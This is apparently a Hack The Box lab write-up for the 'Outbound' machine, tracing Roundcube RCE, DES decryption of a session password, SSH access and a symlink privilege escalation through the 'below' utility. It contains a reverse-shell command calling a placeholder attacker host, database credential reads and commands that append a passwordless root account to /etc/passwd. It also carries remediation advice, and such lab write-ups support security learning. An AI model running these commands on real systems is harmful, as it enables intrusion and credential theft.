---
title: "Outbound — Roundcube RCE, DES Session Decryption, and below Symlink Privilege Escalation"
seoTitle: "Outbound — Roundcube RCE and below Symlink Privilege Escalation"
description: "Authenticated Roundcube RCE (CVE-2025-49113) and session-table password decryption with the application DES key lead to SSH access; a symlink attack on the below utility's error log (CVE-2025-27591) yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - roundcube
  - cve
  - privilege-escalation
objective: "Move from provided webmail credentials to root by exploiting an authenticated Roundcube RCE, recovering a session-stored password with the application DES key, and abusing a privileged logging utility."
tools:
  - rustscan
  - penelope
  - php
  - mysql
  - python3
  - sshpass
  - ssh
  - below
skill: "Authenticated web application exploitation, application-secret recovery, and Linux privilege escalation through an unsafe privileged utility"
outcome: "Code execution as the Roundcube service account, SSH access as the local `<SYSTEM_ACCOUNT>` account via a mailbox-disclosed password, and root through the `below` symlink attack"
---

## At a glance

| Field | Value |
|---|---|
| Target environment | Ubuntu Linux; nginx 1.24.0 fronting a Roundcube webmail instance, OpenSSH 9.6p1 |
| Starting position | Provided low-privileged webmail credentials |
| Objective | Reach root through a vulnerable Roundcube instance, recovered application secrets, and a privileged logging utility |
| Outcome | Code execution as the Roundcube service account, SSH access as a local account, and root via the `below` symlink attack |

## From Roundcube RCE to below symlink root

Outbound is a Hack The Box Linux lab that chains an authenticated Roundcube remote code execution flaw (CVE-2025-49113) into full root access. The webmail configuration exposes the application database and its `des_key`, so a session-stored password can be decrypted; the recovered webmail account discloses a system password that authenticates over SSH, and a symlink attack on the `below` logging utility (CVE-2025-27591) modifies `/etc/passwd` to gain root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and preserves command syntax. See [how evidence is handled](/method/).

**Attack path:** **authenticated Roundcube RCE (CVE-2025-49113) → `www-data` shell → `config.inc.php` database credential recovery → DES session password decryption → mailbox credential disclosure → SSH as `<SYSTEM_ACCOUNT>` → `below` symlink attack (CVE-2025-27591) → root**

## nginx Roundcube host from provided webmail credentials

- **Target:** an Ubuntu Linux host exposing SSH (22) and nginx (80) fronting the `mail.<DOMAIN>` webmail virtual host.
- **Application:** Roundcube webmail served from `/var/www/html/roundcube` and backed by a local MySQL database.
- **Starting position:** provided low-privileged `<WEBMAIL_ACCOUNT>` webmail credentials.
- **Objective:** move from the provided webmail account to root, and demonstrate the impact of an unpatched webmail flaw, application secrets reachable by the web user, and an unsafe privileged utility.
- **Constraints:** activity was confined to the Hack The Box lab environment, and the web requests required resolving `mail.<DOMAIN>` locally.

## Evidence: Roundcube RCE to below symlink attack

### 1. Service Discovery

Observation: a fast TCP scan exposes SSH and an nginx web service whose HTTP title redirects to a hostname-based webmail virtual host.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
```

```text
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.<DOMAIN>/
```

Significance: port 80 advertises no application directly but redirects to a named virtual host, so the webmail application is reached by resolving `mail.<DOMAIN>` locally rather than the bare address.

Result: SSH and an nginx service fronting a virtual-hosted webmail application are identified.

### 2. CVE-2025-49113: Authenticated Roundcube RCE

Observation: the application is a Roundcube webmail instance, and provided credentials are available for the `<WEBMAIL_ACCOUNT>` account. Roundcube before 1.5.10 and 1.6.x before 1.6.11 is affected by CVE-2025-49113, an authenticated PHP object deserialization flaw in `program/actions/settings/upload.php`.

Action: start a listener and run the exploit with the provided credentials and a reverse-shell command.

```bash
penelope -p <LISTENER_PORT>
```

```bash
php CVE-2025-49113.php http://mail.<DOMAIN>/ '<WEBMAIL_ACCOUNT>' '<WEBMAIL_ACCOUNT_PASSWORD>' 'bash -c "sh -i >& /dev/tcp/<ATTACKER_IP>/<LISTENER_PORT> 0>&1"'
```

The source records a reverse shell as the `www-data` service account, but no terminal output for this step was retained; the shell is reconstructed from the notes.

Significance: the flaw executes in the Roundcube service context, which holds the application configuration and the database credentials it references.

Result: authenticated code execution is obtained as `www-data`.

### 3. Database Configuration and Session Credential Recovery

Observation: the Roundcube configuration stores its database connection string in plaintext, and the `www-data` user can read it.

```bash
cat /var/www/html/roundcube/config/config.inc.php
```

```php
$config['db_dsnw'] = 'mysql://roundcube:<MYSQL_PASSWORD>@localhost/roundcube';
```

The recovered credentials reach the application database, whose `session` table holds active sessions with serialized PHP blobs; `<SYSTEM_ACCOUNT>`'s session value carries an encrypted password.

```bash
mysql -u roundcube -p<MYSQL_PASSWORD> roundcube
```

```sql
select * from session;
```

```bash
echo '<BASE64_PAYLOAD>' | base64 -d | tr ';' '\n'
```

```text
;username|s:<USERNAME_LENGTH>:"<SYSTEM_ACCOUNT>"
;password|s:32:"<ENCRYPTED_PASSWORD>"
```

Significance: Roundcube persists per-user session state in the database, including a base64-encoded, DES-encrypted login password, so the same secret-bearing store that the web application user already reaches also carries recoverable credentials.

Result: an encrypted session password for `<SYSTEM_ACCOUNT>` is recovered.

### 4. DES Session Password Decryption

Observation: the configuration file also contains the `des_key` used to encrypt the passwords stored in session data.

```php
$config['des_key'] = '<DES_KEY>';
```

Action: run a decryption script that takes the encrypted password from the session and the `des_key` from the configuration.

```bash
python3 rcube-decrypt.py
```

```text
Decrypted password (utf-8): <ROUNDCUBE_PASSWORD>
```

Significance: the key that protects the stored password sits beside the ciphertext in the same readable configuration, so the stored password is reversible from the same readable file.

Result: `<SYSTEM_ACCOUNT>`'s Roundcube password is recovered and subsequently validated through the webmail application.

### 5. Mailbox Disclosure and SSH Access

Observation: logging into Roundcube as `<SYSTEM_ACCOUNT>` with the recovered password exposes a mailbox message that carries a new system password.

```text
From: <WEBMAIL_ACCOUNT>

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: <SYSTEM_ACCOUNT_PASSWORD>

Remember to change your password when you next log into your account.

Thanks!
```

Action: use the disclosed password over SSH.

```bash
sshpass -p '<SYSTEM_ACCOUNT_PASSWORD>' ssh <SYSTEM_ACCOUNT>@<DOMAIN>
```

```text
<SYSTEM_ACCOUNT>@<DOMAIN>:~$
```

Significance: the mailbox message converts a webmail-only secret into a system credential, so compromising the webmail layer exposes the interactive account rather than a single application.

Result: an authenticated SSH shell is obtained as `<SYSTEM_ACCOUNT>`.

### 6. CVE-2025-27591: below Symlink Privilege Escalation

Observation: I checked the sudo policy: `<SYSTEM_ACCOUNT>` can run `/usr/bin/below` as root, and `below` before 0.9.0 writes its logs under a directory writable by the low-privileged user, which enables a symlink attack (CVE-2025-27591).

```bash
sudo -l
```

```text
User <SYSTEM_ACCOUNT> may run the following commands on <DOMAIN>:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d
```

Action: run `below` once to generate its root-owned logs, replace the error log with a symlink to `/etc/passwd`, run `below` again so the root-owned writer follows the symlink, then append a root-equivalent account and switch to it.

```bash
sudo below
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
sudo below
```

```bash
echo '<NEW_USER>::0:0:root:/root:/bin/bash' >> /etc/passwd
su <NEW_USER>
```

```text
root@<DOMAIN>
```

Significance: a privileged writer that resolves its log path through user-writable storage can be redirected to an arbitrary file, so a routine permission change on the log becomes a change on `/etc/passwd`.

Result: root command execution is confirmed by the root shell.

## The encrypted session, restricted flags, and missing logs

| Challenge | Decision | Rationale |
|---|---|---|
| The session password is stored encrypted and is unusable on its own | Recovered the `des_key` from `config.inc.php` and decrypted the session value | The ciphertext only becomes a usable credential when paired with the application key |
| The sudo policy denies `below --config`, `--debug`, and `-d` | Used the default `below` invocation that the policy permits | The symlink attack needs only the root log writer, not the restricted flags |
| The `below` log directory does not exist until the utility first runs | Ran `below` once to create its world-writable log directory and files, then removed and relinked `error_root.log` | `below` writes as root into a directory the low-privileged user can modify, so the next run follows the symlink and the root-owned writer acts on `/etc/passwd` |

## Outcome: root via the below log symlink

Root command execution on the host is confirmed. Access rested on an unpatched Roundcube instance, application secrets readable by the web service user, and a privileged logging utility that resolved its log path through user-writable storage. HTTP and SSH were the only exposed services.

## Recommendations: Roundcube, plaintext config, session secrets, and below

I did not validate these recommendations during the lab work.

1. **Unpatched Roundcube (CVE-2025-49113).** An authenticated user could reach code execution through the upload action's unvalidated `_from` parameter. *Recommendation:* upgrade to a fixed release (1.5.10 or 1.6.11) and restrict access to the webmail application. *Detection:* monitor for object-deserialization patterns and unexpected `_from` values in requests to `program/actions/settings/upload.php`.
2. **Plaintext database credentials in application configuration.** The MySQL password was stored in `config.inc.php`, readable by the web application user. *Recommendation:* store configuration outside the web root under restrictive ownership and permissions, and scope database accounts to least privilege. *Detection:* scan configuration files and backups for embedded secrets.
3. **Reversible passwords in session data.** The `session` table held passwords encrypted with the application `des_key`, and both the ciphertext and the key were reachable from the web user's context. *Recommendation:* avoid storing reversible credentials in session state, rotate the `des_key`, and keep key material separate from the data it protects. *Detection:* audit the `session` table for credential-bearing fields.
4. **Symlink attack in a privileged logging utility (CVE-2025-27591).** `below` created a user-writable log location and followed a symlink when writing as root, which allowed modification of `/etc/passwd`. *Recommendation:* upgrade `below` to 0.9.0 or later, keep its log directory root-owned and non-writable, and narrow the sudo policy that allows it. *Detection:* monitor symlink creation in logging directories and unexpected writes to `/etc/passwd`.

## References

- [Hack The Box — Outbound](https://app.hackthebox.com/machines/Outbound) (retired machine)
- [NVD — CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113) (Roundcube authenticated PHP object deserialization)
- [Roundcube security updates 1.6.11 and 1.5.10](https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10) (vendor advisory for CVE-2025-49113)
- [NVD — CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591) (`below` world-writable log directory symlink privilege escalation)
- [Facebook security advisory — CVE-2025-27591](https://www.facebook.com/security/advisories/cve-2025-27591) (vendor advisory and fix for `below`)
- [Below](https://github.com/facebookincubator/below) (system monitoring utility affected by CVE-2025-27591)
- [RustScan](https://github.com/RustScan/RustScan) (fast TCP port scanner)
- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
